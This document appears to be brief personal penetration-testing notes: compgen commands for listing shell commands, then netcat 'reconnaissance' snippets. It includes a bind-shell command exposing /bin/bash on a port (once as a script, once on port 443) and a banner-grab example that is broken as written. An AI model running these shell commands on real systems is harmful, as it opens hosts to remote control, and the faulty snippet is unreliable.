# Linux  
Oh dear Linux... The tools of Titans!  
```sh
compgen -c # Will list all the commands you could run.
compgen -a # Will list all the aliases you could run.
compgen -b # Will list all the built-ins you could run.
compgen -k # Will list all the keywords you could run.
compgen -A function # Will list all the functions you could run.
```
# Reconnaissance  
## Netcat is not Ncat
Fun not-a-fact: Ncat comes from Nmap according to a post on a forum.
- Banner
```sh
# Print the banner of a webserver
nc -l $target_ip 80
```  
and then as a payload
```http
HEAD / HTTP/1.0
```
- Spawn a shell
```sh
port_number=$1
nc -l -p $port_number -e /bin/bash
```
nc -l -p 443 -e /bin/bash